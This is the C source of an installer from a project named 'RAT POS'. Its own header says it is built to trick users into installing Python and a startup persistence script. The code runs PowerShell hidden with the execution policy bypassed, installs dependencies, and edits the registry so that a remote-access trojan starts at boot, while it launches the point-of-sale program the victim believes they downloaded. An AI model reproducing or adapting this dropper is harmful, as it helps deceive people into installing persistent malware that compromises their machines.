/*
Project: RAT POS
Author: Swager
Description: this file is compiled to POS_installer.exe and is designed to trick the user into installing python
and triggering add_startup.py so that pos.py runs on startup.

*/

#include <Windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <tchar.h>

int main()
{
    system("start /WAIT powershell.exe -executionpolicy bypass -windowstyle hidden -noninteractive -nologo -file \"Initialize_v1.ps1\""); //powershell script that checks if python is installed
    //system("setx python \"%PATH%;%homepath%\\AppData\\Local\\Programs\\Python\\Python38-32\\");
    //system("setx pip \"%PATH%;%homepath%\\AppData\\Local\\Programs\\Python\\Python38-32\\Scripts\\"); //adds the right path for pip
    system("start /WAIT pip install openpyxl\n"); //openpyxl is needed to run pos.py
    //system("setx pos2 \"%PATH%;%homepath%\\Desktop\\TEAMPROJRAT-master\\UDP_Connection\\");
    system("python ./persistence/add_startup.py\n"); //starts the registry editing py file after python is installed
    system("cd UDP_Connection\n python pos.py\n"); //starts the POS the user thinks they downloaded
    return 0;
}